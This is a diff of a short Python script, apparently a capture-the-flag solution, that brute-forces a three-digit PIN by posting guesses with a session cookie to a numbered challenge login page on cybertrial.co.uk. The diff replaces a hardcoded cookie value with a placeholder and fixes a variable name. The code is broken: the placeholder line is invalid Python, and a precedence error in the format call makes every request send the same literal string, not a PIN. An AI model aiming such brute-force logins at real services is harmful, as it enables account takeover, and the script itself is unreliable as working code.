@@ -3,11 +3,11 @@ import time
 import requests
 
 challenge_number = 104
-cookie = "ph5laj0dcctcg9nd7oujdn1art"
-highers_num = 999
+cookie = // Capture valid cookie //
+highest_num = 999
 digits = 3
 
-for i in range(highers_num):
+for i in range(highest_num):
 
     pin = '{0:0' + str(digits) + '}'.format(i)
     request = requests.post("http://" + str(challenge_number) + ".cybertrial.co.uk/login", data={"formgo": "1", "pin": pin}, cookies={"PHPSESSID": cookie})
